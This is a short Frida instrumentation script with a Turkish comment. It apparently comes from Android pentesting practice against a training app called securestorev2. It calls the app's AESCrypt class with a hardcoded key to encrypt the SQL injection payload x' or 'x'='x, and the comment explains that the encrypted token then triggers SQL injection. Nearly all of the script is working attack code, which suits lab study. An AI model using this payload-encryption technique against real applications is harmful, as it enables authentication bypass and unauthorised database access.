"use strict";

/**
 * ! AES crypt işlmi için o yazıldı. Şifrelenen datayı token olarak gönderildiğinde sql injection yapılmaktadır.
 *
 */
if (Java.available) {
  Java.perform(function () {
    try {
      let target_class = Java.use(
        "com.androidpentesting.securestorev2.AESCrypt"
      );

      let encrytedText = target_class.encrypt(
        "securestoreandroidaes",
        "x' or 'x'='x"
      );

      console.log("encrytedText:", encrytedText);
    } catch (err) {
      console.log("[-] An execption occured");
      console.log(String(err.stack));
    }
  });
} else {
  console.log("[-] Java is not available ");
}
